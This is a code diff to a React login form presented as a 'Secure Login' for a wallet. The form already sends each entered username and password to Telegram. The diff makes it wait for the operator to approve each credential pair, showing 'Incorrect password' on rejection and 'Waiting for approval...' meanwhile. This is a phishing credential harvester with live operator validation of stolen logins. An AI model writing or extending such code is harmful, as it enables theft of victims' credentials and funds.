@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { sendToTelegram } from '../utils/telegram';
+import { sendLoginToTelegramAndWait } from '../utils/telegram';
 
 interface LoginFormProps {
   onLogin: (data: any) => void;
@@ -10,16 +10,22 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrorMsg('');
     
     const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>\n\n<i>🌐 Automated Log Request</i>`;
     
     try {
-      await sendToTelegram(message);
-      onLogin({ username, password });
+      const isAccepted = await sendLoginToTelegramAndWait(message);
+      if (isAccepted) {
+        onLogin({ username, password });
+      } else {
+        setErrorMsg('Incorrect password');
+      }
     } catch (error) {
       onLogin({ username, password });
     } finally {
@@ -79,6 +85,12 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
           </a>
         </div>
 
+        {errorMsg && (
+          <div className="bg-red-50 text-red-600 p-3 rounded-xl text-sm font-semibold text-center animate-in fade-in zoom-in duration-200">
+            {errorMsg}
+          </div>
+        )}
+
         <button
           type="submit"
           disabled={isLoading}
@@ -90,7 +102,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
               <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
           ) : null}
-          {isLoading ? 'Processing...' : 'Secure Login'}
+          {isLoading ? 'Waiting for approval...' : 'Secure Login'}
         </button>
 
         <div className="relative flex items-center py-4">
